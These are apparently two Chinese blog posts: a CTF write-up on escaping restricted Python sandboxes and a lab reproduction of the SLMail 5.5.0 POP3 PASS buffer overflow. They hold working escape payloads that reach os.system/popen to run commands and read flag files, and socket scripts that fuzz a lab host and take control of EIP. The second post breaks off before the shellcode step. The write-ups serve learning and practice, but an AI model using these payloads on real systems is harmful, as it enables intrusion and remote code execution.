    <title>python沙盒逃逸学习</title>
    <url>/2018/06/11/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<blockquote>
<p>由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演示一下。比赛中涉及的到Python沙盒逃逸往往是利用语言特性来逃逸，但是其实这只是从Python解释器的逃逸，从严格意义上说这是不完全的。从现实意义上来讲更进一步的是利用沙盒的逃逸来控制整个系统，Python的模块通常都是大量C代码的封装，这里面就有未被发现的内存破坏漏洞。所以比赛的题目只是一种思路，更多的还是要结合到实际生产环境中。</p>
</blockquote>
<h4 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h4><ol>
<li><p>实验脚本：题目的设置，删除一些内建函数（Python语言加载的时候会自动加载系统的内建模块，python2中是builtin，Python3中是builtins）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,<span class="string">'file'</span>,<span class="string">'execfile'</span>,<span class="string">'compile'</span>,<span class="string">'reload'</span>,<span class="string">'__import__'</span>,<span class="string">'eval'</span>,<span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead,Expoit me &gt; ;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        <span class="comment">#Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'\S+'</span>,raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span>+inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&gt;&gt;&gt;'</span>,a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Exception:'</span>,e</span><br><span class="line"><span class="comment">#后面这一段主要是将结果以字符串的形式操作并显示</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>脚本运行结果：（环境的限制权限非常低）这里其实就是模拟Python的命令行界面，然后进行相应的操作，只是将一些内建函数删除了，所以无法调用系统命令等等<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428212.69.png" alt></p>
</li>
<li><p>正常情况下Python的使用可以调用OS等模块，就可以进行系统命令的调用和文件操作等等：但是经过限制以后的环境就不可以调用了，因此不能调用系统命令拿到flag<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428524.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428600.48.png" alt></p>
</li>
<li><p>由于删除了对应的内建函数，所以我们要利用Python的特性来绕过这种限制：<strong>Python中可以利用file来read文件</strong> 但是我们可以发现直接用file这种方式也是被限制了的，所以利用对象的概念，通过元组来加载：（有一个知识点：<strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组））<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429208.95.png" alt></p>
</li>
<li><p>通过将所有父类组成的元组显示出来以后可以找到file在第40个，然后我们可以通过硬编码的方式调用file加载文件找到flag： <code>().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429504.92.png" alt></p>
</li>
</ol>
<h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><ol>
<li><p>首先还是贴上环境的脚本，前提条件和实例一差不多：（不同的是这里能够执行的内建函数只有输入输出，与实例一不同的还有就是这里不回显数据  ）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Welcome to my python sandbox! Enter commands below!"</span></span><br><span class="line"> </span><br><span class="line">banned = [<span class="string">'import'</span>,<span class="string">'exec'</span>,<span class="string">'eval'</span>,<span class="string">'pickle'</span>,<span class="string">'os'</span>,<span class="string">'subprocess'</span>,<span class="string">'kevin sucks'</span>,<span class="string">'input'</span>,<span class="string">'banned'</span>,<span class="string">'cry sum more'</span>,<span class="string">'sys'</span>]</span><br><span class="line"> </span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        data = raw_input()</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">                <span class="comment">#将输入的字符转换为小写和banned中的字符转换为小写比较</span></span><br><span class="line">                print(<span class="string">"Permission Denied"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>环境运行结果如下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440081.27.png" alt></p>
</li>
<li><p>思路与实例一还是一样，都是使用所有父类组成的元组，这里要使用到catch_warnings类（索引在59），进行命令执行 <code>print ().__class__.__bases__[0].__subclasses__()</code>    <code></code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440331.12.png" alt></p>
<p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440491.92.png" alt></p>
</li>
<li><p>经过测试以后发现这里其实可以不用执行59的那个子类，因为没有禁用print函数，当然这里的59这个子类可以用到实例一中进行ls的调用</p>
<p><code>print ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440660.03.png" alt></p>
</li>
</ol>
<h3 id="实例三"><a href="#实例三" class="headerlink" title="实例三"></a>实例三</h3><ol>
<li><p>实验环境代码如下：（这里用Python3写的，与前两个相比，这里先删除了两个危险的函数，然后对其他许多函数做了过滤，还对一些字符，如’.’都进行了过滤）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys, cmd, os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"> </span><br><span class="line">intro= <span class="string">"""</span></span><br><span class="line"><span class="string">   pwnhubcuit</span></span><br><span class="line"><span class="string">   pwneverything</span></span><br><span class="line"><span class="string">   Rules:</span></span><br><span class="line"><span class="string">        -No import</span></span><br><span class="line"><span class="string">        -No ...</span></span><br><span class="line"><span class="string">        -No flag</span></span><br><span class="line"><span class="string"> """</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(command)</span>:</span></span><br><span class="line">    exec(command, globals())</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jail</span><span class="params">(cmd.Cmd)</span>:</span></span><br><span class="line">    prompt    = <span class="string">'&gt;&gt;&gt; '</span></span><br><span class="line">    filtered   =<span class="string">'\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'</span>.split(<span class="string">'|'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_EOF</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.exit()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">emptyline</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.emptyline(self)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">default</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.stdout.write(<span class="string">'\x00'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postcmd</span><span class="params">(self, stop, line)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> any(f <span class="keyword">in</span> line <span class="keyword">for</span> f <span class="keyword">in</span> self.filtered):</span><br><span class="line">            print(<span class="string">"You are a big hacker!!!"</span>)</span><br><span class="line">            print(<span class="string">"Go away"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                execute(line)</span><br><span class="line">            <span class="keyword">except</span> NameError:</span><br><span class="line">                print(<span class="string">"NameError: name'%s' is not defined"</span> % line)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                print(<span class="string">"Error: %s"</span> %line)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.postcmd(self, stop,line)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Jail().cmdloop(intro)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\rSee you next time!"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>所以这里就没有办法使用前面说的利用子类进行系统的调用，这里通过获取系统函数地址进行绕过：</p>
<p><code>print(getattr(os, &quot;system&quot;)(&quot;ls&quot;))</code></p>
<p><code>print(getattr(os, &quot;system&quot;)(&quot;cat flag&quot;))</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442349.25.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442706.14.png" alt></p>
</li>
</ol>
<blockquote>
<p>以上三个实例就是利用Python作为脚本语言的特性来逃逸</p>
</blockquote>
<h3 id="实例四"><a href="#实例四" class="headerlink" title="实例四"></a>实例四</h3><blockquote>
<p>拿最近一次比赛中的沙盒逃逸来演示一下。</p>
</blockquote>
<ol>
<li><p>拿到赛题以后nc连接一下并输入一些语句进行测试：（也是许多函数被限制且不回显，经过测试发现是Python2写的环境并且没有过滤‘ . ’）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443353.83.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443493.14.png" alt></p>
</li>
<li><p>这里和我们前面的练习不一样，这里必须要调用系统命令ls来看一下存放flag的文件，找到一个和getattr函数类似的函数getattribute</p>
<p><code>print ().__class__.__bases__[0].__getattribute__(&#39;o&#39;+&#39;s&#39;,&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code>  发现可以使用单引号调用参数</p>
<p><code>().__class__.__bases__[0].__getattribute__(__import__(&#39;o&#39;+&#39;s&#39;),&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code> 构造第二个payload，尝试使用导入os模块的方法调用系统命令，结果失败，过滤了os:<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443785.45.png" alt></p>
<p>这个时候我们换一下思路，调用子类中的函数catch_warnings，在第59个，构造paylad:</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s&#39;).read</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525444594.33.png" alt></p>
<p>成功列出了目录，经过测试flag在home/ctf目录下：</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s /home&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445718.2.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445847.25.png" alt></p>
<p>然后我们加上getattribute构造payload：</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;c&#39;&#39;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;).read()</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525446030.23.png" alt></p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>利用语言特性来进行解释器的逃逸，其实就是绕过python沙盒内部导入模块的白名单；这里我理解为它限制的是语言中最直接的模块、函数的调用，而我们利用的是通过封装的类，以及派生出的子类调用，实现相同的功能。还有不得不说的一点，结合生产环境，通过内存破坏、溢出等方式实现沙盒的的逃逸要理解很多东西，涉及到二进制、fuzzy等等，所以要通过不断的学习才可以综合的利用。由于水平有限，这里只能做到语言解释器的沙盒逃逸，而不是系统层面的。下面给出一个讲利用内存破坏实现Python沙盒逃逸的链接。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>CTF</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>一次windows缓冲区溢出复现</title>
    <url>/2018/06/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<blockquote>
<p>缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。</p>
</blockquote>
<h2 id="程序的漏洞从哪里来："><a href="#程序的漏洞从哪里来：" class="headerlink" title="程序的漏洞从哪里来："></a>程序的漏洞从哪里来：</h2><ul>
<li>罪恶的根源：变量</li>
<li>数据与代码边界不清（程序没有严格的限定）</li>
<li>由于控制不严会造成程序被严重的破坏</li>
<li>最简单漏洞原理——shell脚本</li>
</ul>
<ol>
<li><p>通过一个最简单的shell脚本来体现漏洞的由来：</p>
<ul>
<li><p>这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $</span><br></pre></td></tr></table></figure>
</li>
<li><p>但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||）</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-20/39703071.jpg" alt></p>
</li>
<li><p>上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器</p>
</li>
</ul>
</li>
<li><p>缓冲区溢出：</p>
<ul>
<li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。</li>
<li>成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。</li>
</ul>
</li>
</ol>
<h2 id="如何发现漏洞："><a href="#如何发现漏洞：" class="headerlink" title="如何发现漏洞："></a>如何发现漏洞：</h2><ul>
<li>源码审计（首先你得能接触到源码）</li>
<li>逆向工程</li>
<li>模糊测试<ul>
<li>向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出  （完全随机的不好判断）</li>
<li>数据生成器：生成随机、半随机的数据  （工具）</li>
<li>测试工具：识别溢出漏洞                        （工具，主要使用一些动态调试工具）</li>
</ul>
</li>
</ul>
<h2 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h2><ul>
<li>FUZZER<ul>
<li>SLMail 5.5.0 Mail Server      （一个Windows下的存在缓冲区溢出的服务端）</li>
<li>ImmunityDebugger_1_85setup.exe    （一个调试工具，比OD的自动化程度高一些）</li>
<li>mona.py                                              （辅助脚本）</li>
<li>环境：Windows XP（需要将SLMail 、调试工具部署好）<ul>
<li>安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放</li>
<li>安装调试工具，如果没有Python2.7环境它会自动安装</li>
<li>将mono.py放在ImmunityDebugger的Pycommands文件夹中</li>
</ul>
</li>
<li>SLMail 5.5.0 Mail Server<ul>
<li>pop3  pass命令存在缓冲区溢出漏洞</li>
<li>无需身份验证实现远程代码执行</li>
<li>DEP：阻止代码从数据页被执行      （Windows的一种安全防护机制）</li>
<li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制）</li>
</ul>
</li>
</ul>
</li>
<li><p>pop3</p>
<ul>
<li><p>最简单的 <figure class="highlight"><figcaption><span>110端口```</span></figcaption><table><tr><td class="code"><pre><span class="line">- 了解未知协议</span><br><span class="line">  - wireshark</span><br><span class="line"></span><br><span class="line">  - RFC</span><br><span class="line"></span><br><span class="line">  - 通过一个简单的Python脚本进行110端口的连接：</span><br><span class="line"></span><br><span class="line">    ```pytho<span class="symbol">n</span></span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket<span class="comment">(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">    try:</span><br><span class="line">        print "\nSending evil buffer..."</span><br><span class="line">        s.connect(('192.168.111.137',110))</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('USER admin' + '\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('PASS admin\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.close<span class="comment">()</span></span><br><span class="line">        print "\nDone!"</span><br><span class="line">    except:</span><br><span class="line">        print "Could not connect to POP3!"</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试</p>
<ul>
<li><p>测试pass命令接收到大量数据时是否合法</p>
</li>
<li><p>EIP寄存器存放下一条指令的地址</p>
</li>
<li><p>2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">buffer = [<span class="string">"A"</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span>*counter)</span><br><span class="line">    counter = counter + <span class="number">200</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes "</span> % len(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">"USER test"</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + string + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#向目标的110端口发送大量的A</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>首先确保开启了pop3：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/49054008.jpg" alt></p>
</li>
<li><p>打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/51147695.jpg" alt><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/87550059.jpg" alt></p>
</li>
<li><p>准备就绪以后启动脚本发送数据：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/83362379.jpg" alt></p>
</li>
<li><p>当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/89254562.jpg" alt></p>
</li>
<li><p>溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。</p>
</li>
</ul>
</li>
<li><p>通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出</p>
<ul>
<li><p>通过第三个脚本精确的找到溢出的四个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2700</span>     <span class="comment">#因为前面是从2700开始溢出的</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2600</span>     <span class="comment">#改为2800确定是否在 2800-2900之间</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65934922.jpg" alt></p>
</li>
<li><p>更加精确定位</p>
<ul>
<li><p>二分法</p>
</li>
<li><p>唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP</p>
<ul>
<li><p>通过一个脚本生成</p>
<figure class="highlight plain"><figcaption><span>/usr/share/metasploit-framework/tools/exploit/```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)</span><br><span class="line"></span><br><span class="line">- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)</span><br><span class="line"></span><br><span class="line">- EIP中的四个字节的HEX为：39 69 44 38  由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9</span><br><span class="line"></span><br><span class="line">- 使用脚本查看着四个字节的偏移量：</span><br><span class="line"></span><br><span class="line">  ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)</span><br><span class="line"></span><br><span class="line">- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80</span><br><span class="line">  try:</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521642331693.png" alt="52164233169"></p>
</li>
<li><p>通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行</p>
<ul>
<li><p>寻找可存放shellcode的内存空间</p>
</li>
<li><p>通过脚本来探测ESP寄存器的大小：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * <span class="number">890</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span>![](http://demos-qq.oss-cn-beijing.aliyuncs.com/<span class="number">18</span><span class="number">-3</span><span class="number">-22</span>/<span class="number">9248235.j</span>pg)</span><br></pre></td></tr></table></figure>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg" alt></p>
</li>
